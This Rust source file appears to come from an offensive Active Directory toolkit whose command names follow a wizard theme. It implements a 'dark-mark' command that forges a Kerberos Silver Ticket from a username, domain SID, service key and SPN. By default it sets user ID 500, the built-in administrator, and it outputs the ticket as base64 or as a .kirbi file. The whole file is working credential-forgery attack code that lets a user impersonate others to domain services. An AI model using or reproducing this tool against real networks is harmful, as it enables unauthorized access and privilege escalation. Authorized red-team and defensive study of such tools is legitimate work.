use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::dark_arts::{forge_silver, TicketBlueprint};
use crate::dungeon::display_charm::*;
use crate::dungeon::krb_structures::{constants::*, Glyph};

pub struct DarkMark;

impl super::Spell for DarkMark {
    fn incantation(&self) -> &'static str { "dark-mark" }
    fn grimoire(&self) -> &'static str {
        "Forge a Silver Ticket. /user: /domain: /sid: /rc4: or /aes256: /spn: [/id:] [/outfile:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let user   = args.get("user").ok_or_else(|| anyhow::anyhow!("/user: required"))?;
        let domain = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let sid    = args.get("sid").ok_or_else(|| anyhow::anyhow!("/sid: required"))?;
        let spn    = args.get("spn").ok_or_else(|| anyhow::anyhow!("/spn: required"))?;
        let (key, etype) = crate::spells::accio_tgt::resolve_key(args, user, domain)?;
        let parts: Vec<&str> = spn.splitn(2, '/').collect();
        let sname = if parts.len() == 2 {
            Glyph { kind: NT_SRV_INST, parts: parts.iter().map(|s| s.to_string()).collect() }
        } else {
            Glyph::new_principal(spn)
        };
        let bp = TicketBlueprint {
            username: user.clone(), domain: domain.clone(), sid: sid.clone(),
            user_id: args.get("id").and_then(|s| s.parse().ok()).unwrap_or(500),
            service_key: key, service_etype: etype,
            sname: Some(sname), srealm: Some(domain.to_ascii_uppercase()),
            ..Default::default()
        };
        print_banner("Forging Silver Ticket");
        let forged = forge_silver(&bp)?;
        print_success("Silver ticket forged");
        println!("{}", forged.b64);
        if let Some(outfile) = args.get("outfile") {
            std::fs::write(outfile, &forged.kirbi)?;
            print_success(&format!("Written to {}", outfile));
        }
        Ok(())
    }
}
